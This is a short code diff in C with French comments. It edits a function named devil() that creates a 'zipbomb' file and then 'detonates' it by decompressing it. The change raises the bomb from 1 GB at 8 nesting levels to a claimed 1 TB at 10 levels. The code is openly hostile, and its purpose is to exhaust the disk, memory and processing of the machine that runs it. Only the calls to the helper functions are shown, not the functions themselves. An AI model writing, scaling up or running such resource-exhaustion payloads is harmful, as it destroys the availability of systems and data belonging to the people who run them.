@@ -12,8 +12,8 @@ void devil() {
     
     // 2. Creation de la zipbomb
     const char* filename = "devil_zipbomb.bin";
-    create_zipbomb(filename, 1024, 8);  // 1 GB, 8 niveaux
+    create_zipbomb(filename, 1024 * 1024, 10);  // 1 TO (1024 GB), 10 niveaux
     
     // 3. Decompression de la zipbomb
-    detonate_zipbomb(filename, 8, 1024);
+    detonate_zipbomb(filename, 10, 1024 * 1024);
 }
